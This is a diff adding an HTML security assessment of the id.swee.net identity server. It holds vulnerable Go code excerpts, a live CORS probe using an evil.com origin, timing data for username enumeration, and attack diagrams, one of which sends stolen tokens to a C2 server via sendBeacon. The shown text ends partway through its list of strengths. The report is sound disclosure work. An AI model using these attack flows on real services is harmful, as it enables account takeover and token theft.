@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Red Team Report - id.swee.net</title>
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --bg2: #12121a;
+    --bg3: #1a1a26;
+    --border: #2a2a3a;
+    --text: #c8c8d4;
+    --text-dim: #6a6a7a;
+    --accent: #7b68ee;
+    --red: #ff4757;
+    --orange: #ffa502;
+    --yellow: #eccc68;
+    --green: #2ed573;
+    --cyan: #70a1ff;
+    --mono: 'SF Mono', 'Fira Code', 'JetBrains Mono', 'Cascadia Code', Consolas, monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: var(--mono);
+    font-size: 14px;
+    line-height: 1.7;
+    background: var(--bg);
+    color: var(--text);
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 40px 24px 100px;
+  }
+  h1, h2, h3 { font-weight: 600; letter-spacing: -0.02em; }
+  h1 { font-size: 22px; color: #fff; margin-bottom: 8px; }
+  h2 {
+    font-size: 16px;
+    color: var(--accent);
+    margin-top: 48px;
+    margin-bottom: 16px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+  h3 { font-size: 14px; color: #fff; margin: 24px 0 8px; }
+  p { margin-bottom: 12px; }
+  a { color: var(--cyan); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  .subtitle { color: var(--text-dim); margin-bottom: 24px; }
+  .meta { color: var(--text-dim); font-size: 12px; margin-bottom: 32px; }
+  .meta span { margin-right: 20px; }
+
+  /* Severity badges */
+  .sev {
+    display: inline-block;
+    padding: 1px 8px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+  }
+  .sev-high { background: rgba(255,71,87,0.15); color: var(--red); border: 1px solid rgba(255,71,87,0.3); }
+  .sev-med  { background: rgba(255,165,2,0.12); color: var(--orange); border: 1px solid rgba(255,165,2,0.3); }
+  .sev-low  { background: rgba(236,204,104,0.12); color: var(--yellow); border: 1px solid rgba(236,204,104,0.3); }
+  .sev-info { background: rgba(112,161,255,0.1); color: var(--cyan); border: 1px solid rgba(112,161,255,0.2); }
+  .sev-good { background: rgba(46,213,115,0.1); color: var(--green); border: 1px solid rgba(46,213,115,0.2); }
+
+  /* Status badges */
+  .confirmed {
+    display: inline-block;
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-weight: 600;
+    background: rgba(46,213,115,0.12);
+    color: var(--green);
+    border: 1px solid rgba(46,213,115,0.25);
+    margin-left: 6px;
+  }
+  .code-only {
+    display: inline-block;
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-weight: 600;
+    background: rgba(112,161,255,0.1);
+    color: var(--cyan);
+    border: 1px solid rgba(112,161,255,0.2);
+    margin-left: 6px;
+  }
+
+  /* Code blocks */
+  pre {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+    font-size: 12.5px;
+    line-height: 1.6;
+  }
+  code {
+    font-family: var(--mono);
+    font-size: 12.5px;
+  }
+  .code-comment { color: #5a5a6a; }
+  .code-keyword { color: var(--accent); }
+  .code-string { color: var(--green); }
+  .code-danger { color: var(--red); font-weight: 700; }
+  .code-highlight { background: rgba(255,71,87,0.08); display: block; margin: 0 -16px; padding: 0 16px; border-left: 3px solid var(--red); }
+
+  /* ASCII art */
+  .ascii {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+    font-size: 12px;
+    line-height: 1.5;
+    color: var(--text-dim);
+    white-space: pre;
+  }
+  .ascii .attacker { color: var(--red); }
+  .ascii .victim { color: var(--cyan); }
+  .ascii .server { color: var(--green); }
+  .ascii .arrow { color: var(--yellow); }
+  .ascii .label { color: #fff; }
+  .ascii .data { color: var(--orange); }
+
+  /* Summary table */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 12px 0 20px;
+    font-size: 12.5px;
+  }
+  th, td {
+    text-align: left;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  th {
+    color: var(--text-dim);
+    font-weight: 600;
+    text-transform: uppercase;
+    font-size: 10px;
+    letter-spacing: 0.1em;
+  }
+  tr:hover td { background: rgba(123,104,238,0.04); }
+  td:first-child { white-space: nowrap; }
+
+  /* Finding cards */
+  .finding {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px 24px;
+    margin: 16px 0 24px;
+  }
+  .finding-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+    flex-wrap: wrap;
+  }
+  .finding-title { color: #fff; font-weight: 600; }
+  .finding .location {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-bottom: 12px;
+  }
+
+  /* Remediation cards */
+  .remediation {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    border-radius: 0 6px 6px 0;
+    padding: 16px 20px;
+    margin: 12px 0 20px;
+  }
+  .remediation h4 {
+    color: var(--green);
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 8px;
+  }
+
+  /* Dividers */
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 32px 0;
+  }
+
+  /* TOC */
+  .toc {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 24px;
+    margin: 20px 0 32px;
+  }
+  .toc-title { color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 8px; }
+  .toc ul { list-style: none; padding: 0; }
+  .toc li { padding: 3px 0; }
+  .toc li::before { content: ""; }
+
+  /* Positive list */
+  .good-list { list-style: none; padding: 0; }
+  .good-list li { padding: 4px 0; }
+  .good-list li::before { content: "[+] "; color: var(--green); font-weight: 700; }
+
+  /* Timing table */
+  .timing-bar {
+    display: inline-block;
+    height: 12px;
+    border-radius: 2px;
+    vertical-align: middle;
+    margin-left: 8px;
+  }
+
+  /* Header art */
+  .header-art {
+    color: var(--red);
+    font-size: 11px;
+    line-height: 1.3;
+    margin-bottom: 16px;
+    white-space: pre;
+  }
+  .exploit-files {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 20px;
+    margin: 12px 0;
+    font-size: 12px;
+  }
+  .file-link { color: var(--cyan); }
+</style>
+</head>
+<body>
+
+<div class="header-art">
+ ____  _____ ____    _____ _____ ___  __  __
+|  _ \| ____|  _ \  |_   _| ____/ _ \|  \/  |
+| |_) |  _| | | | |   | | |  _|| |_| | |\/| |
+|  _ &lt;| |___| |_| |   | | | |__|  _  | |  | |
+|_| \_\_____|____/    |_| |_____|_| |_|_|  |_|
+</div>
+
+<h1>Red Team Report: id.swee.net</h1>
+<p class="subtitle">Security assessment of the Identity authentication server</p>
+
+<div class="meta">
+  <span>Target: <a href="https://id.swee.net/">id.swee.net</a></span>
+  <span>Source: <a href="https://github.com/sweeney/identity/">github/sweeney/identity</a></span>
+  <span>Date: 2026-03-18</span>
+  <br>
+  <span>Stack: Go + SQLite + JWT (HS256) + bcrypt + OAuth 2.0 PKCE</span>
+  <span>Infra: Cloudflare Tunnel</span>
+</div>
+
+<div class="toc">
+  <div class="toc-title">Contents</div>
+  <ul>
+    <li><a href="#summary">1. Executive Summary</a></li>
+    <li><a href="#vulns">2. Vulnerability Findings</a></li>
+    <li><a href="#good">3. What's Done Well</a></li>
+    <li><a href="#exploits">4. Exploit PoCs</a></li>
+    <li><a href="#remediation">5. Remediation Plan</a></li>
+  </ul>
+</div>
+
+<!-- ================================================================ -->
+<h2 id="summary">1. Executive Summary</h2>
+
+<p>
+  We identified <strong>13 findings</strong> across the codebase and live service.
+  The most critical is a <strong>wildcard CORS misconfiguration</strong> that allows
+  any website to make authenticated API requests and read responses. Combined with
+  the absence of rate limiting and a timing side-channel, an attacker can enumerate
+  users, brute-force passwords, and exfiltrate data cross-origin.
+</p>
+<p>
+  The codebase demonstrates strong security fundamentals overall &mdash;
+  parameterized SQL, hashed tokens, PKCE enforcement, token family rotation &mdash;
+  making these findings stand out as fixable gaps rather than systemic issues.
+</p>
+
+<table>
+  <thead>
+    <tr><th>#</th><th>Severity</th><th>Finding</th><th>Status</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td><span class="sev sev-high">HIGH</span></td><td>Wildcard CORS origin reflection</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>2</td><td><span class="sev sev-med">MEDIUM</span></td><td>No rate limiting on auth endpoints</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>3</td><td><span class="sev sev-med">MEDIUM</span></td><td>Timing-based username enumeration</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>4</td><td><span class="sev sev-med">MEDIUM</span></td><td>Admin session ignores user state changes</td><td><span class="code-only">CODE REVIEW</span></td></tr>
+    <tr><td>5</td><td><span class="sev sev-low">LOW-MED</span></td><td>No CSRF on OAuth authorize POST</td><td><span class="code-only">CODE REVIEW</span></td></tr>
+    <tr><td>6</td><td><span class="sev sev-low">LOW-MED</span></td><td>State param not URL-encoded in redirect</td><td><span class="code-only">CODE REVIEW</span></td></tr>
+    <tr><td>7</td><td><span class="sev sev-low">LOW</span></td><td>Admin login CSRF (no token on form)</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>8</td><td><span class="sev sev-low">LOW</span></td><td>Backup triggered via GET request</td><td><span class="code-only">CODE REVIEW</span></td></tr>
+    <tr><td>9</td><td><span class="sev sev-low">LOW</span></td><td>Minimal password strength validation</td><td><span class="code-only">CODE REVIEW</span></td></tr>
+    <tr><td>10</td><td><span class="sev sev-low">LOW</span></td><td>CSP allows unsafe-inline scripts</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>11</td><td><span class="sev sev-info">INFO</span></td><td>Full OpenAPI spec publicly exposed</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>12</td><td><span class="sev sev-info">INFO</span></td><td>HSTS max-age 30 days, no preload</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+    <tr><td>13</td><td><span class="sev sev-info">INFO</span></td><td>Admin panel has no IP restriction</td><td><span class="confirmed">CONFIRMED LIVE</span></td></tr>
+  </tbody>
+</table>
+
+<!-- ================================================================ -->
+<h2 id="vulns">2. Vulnerability Findings</h2>
+
+<!-- ---- FINDING 1 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-high">HIGH</span>
+    <span class="finding-title">Wildcard CORS Origin Reflection</span>
+    <span class="confirmed">CONFIRMED LIVE</span>
+  </div>
+  <div class="location">cmd/server/main.go:337-345</div>
+
+  <p>
+    The CORS middleware reflects <em>any</em> Origin header value back in
+    <code>Access-Control-Allow-Origin</code>, effectively disabling the Same-Origin Policy
+    for all API and OAuth token endpoints.
+  </p>
+
+  <h3>Vulnerable Code</h3>
+<pre>
+<span class="code-comment">// CORS for API and OAuth token endpoints (needed by SPA clients)</span>
+path := r.URL.Path
+<span class="code-keyword">if</span> strings.HasPrefix(path, <span class="code-string">"/api/"</span>) || path == <span class="code-string">"/oauth/token"</span> {
+<span class="code-highlight">    origin := r.Header.Get(<span class="code-string">"Origin"</span>)
+    <span class="code-keyword">if</span> origin != <span class="code-string">""</span> {
+        w.Header().Set(<span class="code-string">"Access-Control-Allow-Origin"</span>, <span class="code-danger">origin</span>)  <span class="code-comment">// reflects ANY origin</span></span>
+        w.Header().Set(<span class="code-string">"Access-Control-Allow-Methods"</span>, <span class="code-string">"GET, POST, PUT, DELETE, OPTIONS"</span>)
+        w.Header().Set(<span class="code-string">"Access-Control-Allow-Headers"</span>, <span class="code-string">"Authorization, Content-Type"</span>)
+        w.Header().Set(<span class="code-string">"Access-Control-Max-Age"</span>, <span class="code-string">"86400"</span>)
+        w.Header().Set(<span class="code-string">"Vary"</span>, <span class="code-string">"Origin"</span>)
+    }
+}
+</pre>
+
+  <h3>Live Verification</h3>
+<pre>
+$ curl -sD- -o /dev/null -H <span class="code-string">"Origin: https://evil.com"</span> https://id.swee.net/api/v1/auth/me
+
+HTTP/2 401
+<span class="code-danger">access-control-allow-origin: https://evil.com</span>   <span class="code-comment">&lt;-- REFLECTED</span>
+access-control-allow-headers: Authorization, Content-Type
+access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
+access-control-max-age: 86400
+vary: Origin
+</pre>
+
+  <h3>Attack Flow</h3>
+<div class="ascii">
+  <span class="label">CORS Origin Reflection Attack</span>
+
+  <span class="victim">Victim</span>                    <span class="attacker">evil.com</span>                    <span class="server">id.swee.net</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>  <span class="arrow">--- visits page ---></span>   <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>  <span class="arrow">&lt;-- malicious JS ----</span>  <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>  <span class="arrow">--- fetch(/api/v1/auth/me, {Authorization: Bearer token}) --></span>  <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>  <span class="arrow">&lt;--- 200 OK + ACAO: evil.com + user profile JSON -----------</span>  <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>       <span class="attacker">JS reads response</span>  <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>       <span class="attacker">(browser allows it</span>  <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>       <span class="attacker"> because ACAO matches)</span><span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>                            <span class="server">|</span>
+    <span class="victim">|</span>       <span class="data">sendBeacon(C2, stolen_data)</span>                      <span class="server">|</span>
+    <span class="victim">|</span>                     <span class="arrow">---></span> <span class="attacker">|</span>  <span class="attacker">attacker server</span>           <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>  <span class="data">collects tokens,</span>          <span class="server">|</span>
+    <span class="victim">|</span>                          <span class="attacker">|</span>  <span class="data">profile, refresh</span>          <span class="server">|</span>
+</div>
+
+  <p>
+    <strong>Impact:</strong> Any website can call the API as the victim. The attacker can
+    steal access tokens, refresh tokens, user profile data, and maintain persistent access
+    via token refresh &mdash; all without any user interaction beyond visiting a page.
+  </p>
+</div>
+
+<!-- ---- FINDING 2 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-med">MEDIUM</span>
+    <span class="finding-title">No Rate Limiting on Auth Endpoints</span>
+    <span class="confirmed">CONFIRMED LIVE</span>
+  </div>
+  <div class="location">All routers &mdash; no rate limiting middleware exists in the codebase</div>
+
+  <p>
+    There is zero rate limiting anywhere in the application. Login, refresh, OAuth
+    authorize, and token endpoints can be hit at unlimited speed.
+  </p>
+
+  <h3>Live Verification</h3>
+<pre>
+<span class="code-comment"># 5 rapid sequential login attempts &mdash; all accepted, no throttling</span>
+
+Request 1: <span class="code-danger">401</span> in 467ms  <span class="code-string">"invalid username or password"</span>
+Request 2: <span class="code-danger">401</span> in 435ms  <span class="code-string">"invalid username or password"</span>
+Request 3: <span class="code-danger">401</span> in 417ms  <span class="code-string">"invalid username or password"</span>
+Request 4: <span class="code-danger">401</span> in 415ms  <span class="code-string">"invalid username or password"</span>
+Request 5: <span class="code-danger">401</span> in 427ms  <span class="code-string">"invalid username or password"</span>
+                               <span class="code-comment">^^ no 429, no delay escalation, no CAPTCHA</span>
+</pre>
+
+  <h3>Attack Flow</h3>
+<div class="ascii">
+  <span class="label">Brute-Force Attack (no rate limiting)</span>
+
+  <span class="attacker">Attacker</span>                                         <span class="server">id.swee.net</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- POST /auth/login {admin, password1} ------></span>  <span class="server">|</span> <span class="code-danger">401</span>
+    <span class="attacker">|</span> <span class="arrow">-- POST /auth/login {admin, password2} ------></span>  <span class="server">|</span> <span class="code-danger">401</span>
+    <span class="attacker">|</span> <span class="arrow">-- POST /auth/login {admin, password3} ------></span>  <span class="server">|</span> <span class="code-danger">401</span>
+    <span class="attacker">|</span> <span class="arrow">-- POST /auth/login {admin, password4} ------></span>  <span class="server">|</span> <span class="code-danger">401</span>
+    <span class="attacker">|</span>   ...10,000 more requests...                    <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- POST /auth/login {admin, correctpw} ------></span>  <span class="server">|</span> <span class="code-string">200 + tokens</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">all requests accepted</span>                         <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">no lockout, no delay</span>                          <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">~400ms per attempt = ~70/min with bcrypt</span>     <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">async with 10 workers = ~700/min</span>             <span class="server">|</span>
+</div>
+</div>
+
+<!-- ---- FINDING 3 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-med">MEDIUM</span>
+    <span class="finding-title">Timing-Based Username Enumeration</span>
+    <span class="confirmed">CONFIRMED LIVE</span>
+  </div>
+  <div class="location">internal/service/auth_service.go:61-63</div>
+
+  <p>
+    The code attempts to prevent timing-based enumeration by running a dummy bcrypt
+    comparison for unknown users. However, the dummy hash is a <strong>placeholder string</strong>
+    that doesn't match valid bcrypt format, causing bcrypt to bail out early instead of
+    doing real work.
+  </p>
+
+  <h3>Vulnerable Code</h3>
+<pre>
+user, err := s.users.GetByUsername(username)
+<span class="code-keyword">if</span> errors.Is(err, domain.ErrNotFound) {
+    <span class="code-comment">// Constant-time: still run bcrypt to prevent timing-based username enumeration</span>
+<span class="code-highlight">    auth.CheckPassword(password, <span class="code-danger">"$2a$12$placeholder-hash-to-burn-time-here"</span>)</span>
+    <span class="code-comment">// ^^^ THIS IS NOT A VALID BCRYPT HASH!</span>
+    <span class="code-comment">// bcrypt.CompareHashAndPassword returns immediately with ErrHashTooShort</span>
+    <span class="code-comment">// Real hash has 60 chars with proper salt; this is ~42 chars</span>
+    s.record(&amp;domain.AuthEvent{...})
+    <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, ErrInvalidCredentials
+}
+</pre>
+
+  <h3>Live Timing Measurements</h3>
+<pre>
+<span class="code-comment"># Existing user "admin" vs nonexistent user &mdash; 4 rounds each</span>
+
+         <span class="label">admin (exists)             nonexistent_xyz_12345</span>
+Round 1: <span class="code-danger">402ms</span> <span style="color:var(--red)">||||||||||||||||||||</span>     <span class="code-string">132ms</span> <span style="color:var(--green)">||||||</span>
+Round 2: <span class="code-danger">575ms</span> <span style="color:var(--red)">|||||||||||||||||||||||||||||</span>  <span class="code-string">321ms</span> <span style="color:var(--green)">||||||||||||||||</span>
+Round 3: <span class="code-danger">642ms</span> <span style="color:var(--red)">||||||||||||||||||||||||||||||||</span> <span class="code-string">151ms</span> <span style="color:var(--green)">|||||||</span>
+Round 4: <span class="code-danger">420ms</span> <span style="color:var(--red)">|||||||||||||||||||||</span>    <span class="code-string">131ms</span> <span style="color:var(--green)">||||||</span>
+
+Average: <span class="code-danger">510ms</span>                       <span class="code-string">184ms</span>
+Delta:   <span class="data">~326ms &mdash; consistent, easily exploitable</span>
+</pre>
+
+  <h3>Attack Flow</h3>
+<div class="ascii">
+  <span class="label">Username Enumeration via Timing</span>
+
+  <span class="attacker">Attacker</span>                                         <span class="server">id.swee.net</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(alice, x) --></span>  <span class="code-danger">401 in 132ms</span>  <span class="data">[no bcrypt]</span>  <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(bob, x)   --></span>  <span class="code-danger">401 in 145ms</span>  <span class="data">[no bcrypt]</span>  <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(admin, x) --></span>  <span class="code-danger">401 in 510ms</span>  <span class="data">[bcrypt!]</span>    <span class="server">|</span>  <span class="code-string">&lt;-- USER EXISTS</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(carol, x) --></span>  <span class="code-danger">401 in 128ms</span>  <span class="data">[no bcrypt]</span>  <span class="server">|</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">Same error message, but 3x slower = user exists</span>
+    <span class="attacker">|</span>   <span class="data">Attacker now targets "admin" for brute-force</span>
+</div>
+
+  <p>
+    <strong>Root cause:</strong> The placeholder string
+    <code>$2a$12$placeholder-hash-to-burn-time-here</code> is not a valid bcrypt hash
+    (too short, invalid salt encoding). <code>bcrypt.CompareHashAndPassword</code>
+    returns immediately with an error instead of performing the expensive comparison.
+  </p>
+</div>
+
+<!-- ---- FINDING 4 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-med">MEDIUM</span>
+    <span class="finding-title">Admin Session Not Validated Against User State</span>
+    <span class="code-only">CODE REVIEW</span>
+  </div>
+  <div class="location">internal/handler/admin/handler.go:58-69</div>
+
+  <p>
+    Admin sessions are JWT cookies with an 8-hour TTL. The validation function only checks
+    the JWT signature and expiry &mdash; it never queries the database to confirm the user
+    still exists, is still active, or still has the admin role.
+  </p>
+
+  <h3>Vulnerable Code</h3>
+<pre>
+<span class="code-keyword">func</span> (h *adminHandler) mintSession(username <span class="code-keyword">string</span>) (<span class="code-keyword">string</span>, <span class="code-keyword">error</span>) {
+    claims := jwt.RegisteredClaims{
+        ExpiresAt: jwt.NewNumericDate(time.Now().Add(sessionTTL)),  <span class="code-comment">// 8 hours</span>
+        Subject:   username,  <span class="code-comment">// only the username, nothing else</span>
+    }
+    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+    <span class="code-keyword">return</span> token.SignedString([]<span class="code-keyword">byte</span>(h.cfg.SessionSecret))
+}
+
+<span class="code-highlight"><span class="code-keyword">func</span> (h *adminHandler) validateSession(tokenStr <span class="code-keyword">string</span>) <span class="code-keyword">bool</span> {
+    _, err := h.parseSession(tokenStr)   <span class="code-comment">// only checks sig + expiry</span>
+    <span class="code-keyword">return</span> err == <span class="code-keyword">nil</span>                     <span class="code-comment">// never queries DB for user state</span>
+}</span>
+</pre>
+
+  <h3>Attack Flow</h3>
+<div class="ascii">
+  <span class="label">Stale Admin Session Exploit</span>
+
+  <span class="attacker">Rogue Admin</span>    <span class="victim">Good Admin</span>       <span class="server">id.swee.net</span>
+    <span class="attacker">|</span>                 <span class="victim">|</span>                <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login ---></span>  <span class="victim">|</span>                <span class="server">|</span> <span class="code-string">sets 8hr session cookie</span>
+    <span class="attacker">|</span>                 <span class="victim">|</span>                <span class="server">|</span>
+    <span class="attacker">|</span>     <span class="victim">demotes rogue admin to "user" role</span>  <span class="server">|</span>
+    <span class="attacker">|</span>                 <span class="victim">|</span> <span class="arrow">----------></span>  <span class="server">|</span>
+    <span class="attacker">|</span>                 <span class="victim">|</span>                <span class="server">|</span>
+    <span class="attacker">|</span> <span class="data">still has valid session cookie</span>       <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- GET /admin/ (with old cookie) --></span> <span class="server">|</span> <span class="code-danger">200 OK (full access!)</span>
+    <span class="attacker">|</span>                 <span class="victim">|</span>                <span class="server">|</span>
+    <span class="attacker">|</span>  <span class="data">retains full admin access for up to 8 more hours</span>
+</div>
+</div>
+
+<!-- ---- FINDING 5 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-low">LOW-MED</span>
+    <span class="finding-title">No CSRF on OAuth Authorize POST</span>
+    <span class="code-only">CODE REVIEW</span>
+  </div>
+  <div class="location">internal/handler/oauth/handler.go:104-150</div>
+
+  <p>
+    The OAuth authorize POST endpoint has no CSRF protection. The comment claims
+    re-validating the client prevents "CSRF-style attacks" but that's incorrect &mdash;
+    an attacker can submit a form with a valid <code>client_id</code> they control.
+    Practical impact is limited since the user must type their password.
+  </p>
+
+<pre>
+<span class="code-keyword">func</span> (h *oauthHandler) authorizePost(w http.ResponseWriter, r *http.Request) {
+    ...
+    <span class="code-comment">// Re-validate client on POST to prevent CSRF-style attacks</span>
+<span class="code-highlight">    client, err := h.svc.ValidateAuthorizeRequest(clientID, redirectURI)  <span class="code-comment">// NOT csrf protection</span></span>
+    ...
+</pre>
+</div>
+
+<!-- ---- FINDING 6 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-low">LOW-MED</span>
+    <span class="finding-title">State Parameter Not URL-Encoded in Redirect</span>
+    <span class="code-only">CODE REVIEW</span>
+  </div>
+  <div class="location">internal/handler/oauth/handler.go:144-149</div>
+
+<pre>
+<span class="code-comment">// Build redirect URL with code and state</span>
+redirectURL := redirectURI + <span class="code-string">"?code="</span> + rawCode
+<span class="code-keyword">if</span> state != <span class="code-string">""</span> {
+<span class="code-highlight">    redirectURL += <span class="code-string">"&amp;state="</span> + state  <span class="code-comment">// no url.QueryEscape()!</span></span>
+}
+http.Redirect(w, r, redirectURL, http.StatusFound)
+</pre>
+
+  <p>
+    If <code>state</code> contains <code>&amp;</code> or <code>#</code>, it breaks the URL
+    structure. For example <code>state=foo&amp;evil=bar</code> injects an extra query parameter.
+  </p>
+</div>
+
+<!-- ---- FINDINGS 7-10 ---- -->
+<div class="finding">
+  <div class="finding-header">
+    <span class="sev sev-low">LOW</span>
+    <span class="finding-title">Additional Low-Severity Findings</span>
+  </div>
+
+  <h3>7. Admin Login CSRF <span class="confirmed">CONFIRMED LIVE</span></h3>
+  <p>
+    <code>POST /admin/login</code> has no CSRF token (see router.go:42 &mdash; no
+    <code>requireCSRF</code> wrapper). An attacker can auto-submit a form to log the
+    victim into the attacker's account (login CSRF).
+  </p>
+<pre>
+<span class="code-comment">// router.go:41-42 &mdash; login routes have no CSRF middleware</span>
+mux.HandleFunc(<span class="code-string">"GET /admin/login"</span>, h.loginGet)
+<span class="code-highlight">mux.HandleFunc(<span class="code-string">"POST /admin/login"</span>, h.loginPost)  <span class="code-comment">// no requireCSRF!</span></span>
+
+<span class="code-comment">// compare with logout which IS protected:</span>
+mux.Handle(<span class="code-string">"POST /admin/logout"</span>, h.requireSession(<span class="code-keyword">h.requireCSRF</span>(...)))
+</pre>
+
+  <h3>8. Backup Triggered via GET</h3>
+  <p>
+    <code>GET /admin/backup</code> triggers a side-effect (R2 backup). GET requests should
+    be safe/idempotent. A simple <code>&lt;img src="/admin/backup"&gt;</code> on any page
+    the admin visits would trigger a backup.
+  </p>
+<pre>
+<span class="code-highlight">mux.Handle(<span class="code-string">"GET /admin/backup"</span>, h.requireSession(...))  <span class="code-comment">// should be POST + CSRF</span></span>
+</pre>
+
+  <h3>9. Minimal Password Validation</h3>
+<pre>
+<span class="code-keyword">func</span> ValidatePasswordStrength(password <span class="code-keyword">string</span>) <span class="code-keyword">error</span> {
+    <span class="code-keyword">if</span> len(password) &lt; MinPasswordLength {  <span class="code-comment">// MinPasswordLength = 8</span>
+        <span class="code-keyword">return</span> errors.New(...)
+    }
+<span class="code-highlight">    <span class="code-keyword">return</span> <span class="code-keyword">nil</span>  <span class="code-comment">// no complexity check: "aaaaaaaa" passes</span></span>
+}
+</pre>
+
+  <h3>10. CSP Allows unsafe-inline Scripts <span class="confirmed">CONFIRMED LIVE</span></h3>
+<pre>
+w.Header().Set(<span class="code-string">"Content-Security-Policy"</span>,
+    <span class="code-string">"default-src 'self'; "</span>+
+        <span class="code-string">"style-src 'self'; "</span>+
+<span class="code-highlight">        <span class="code-string">"script-src 'self' <span class="code-danger">'unsafe-inline'</span>; "</span>+  <span class="code-comment">// weakens XSS protection</span></span>
+        <span class="code-string">"img-src 'self' data:; "</span>+
+        <span class="code-string">"frame-ancestors 'none'"</span>)
+</pre>
+</div>
+
+<!-- ================================================================ -->
+<h2 id="good">3. What's Done Well</h2>
+
+<p>
+  The codebase demonstrates strong security fundamentals. Many common vulnerability
+  classes are properly mitigated:
+</p>
+
+<ul class="good-list">
+  <li>All SQL queries use parameterized statements (<code>?</code> placeholders) &mdash; no injection</li>
+  <li>No hardcoded secrets &mdash; JWT secrets auto-generated or loaded from env vars</li>
+  <li>Refresh token rotation with family-based theft detection</li>
+  <li>All tokens stored as SHA-256 hashes &mdash; raw tokens never persisted to disk</li>
+  <li>bcrypt at cost 12 for password hashing</li>
+  <li>PKCE S256 required for OAuth &mdash; no downgrade to <code>plain</code></li>
+  <li>Auth codes are single-use with atomic check-and-mark in the DB</li>
+  <li>IDOR protection &mdash; non-admins can only read their own user record</li>
+  <li>Strong security headers: X-Frame-Options DENY, X-Content-Type-Options nosniff, Referrer-Policy</li>
+  <li>Session cookies: HttpOnly, SameSite=Strict, Secure in production</li>
+  <li>OAuth <code>client_id</code> validated before any redirect &mdash; prevents open redirects</li>
+  <li>JWT signing algorithm verified on parse (line 100-101 of jwt.go) &mdash; no alg confusion</li>
+  <li>DB file permissions set to 0600</li>
+  <li>Clean JSON error responses &mdash; no stack traces or framework details leaked</li>
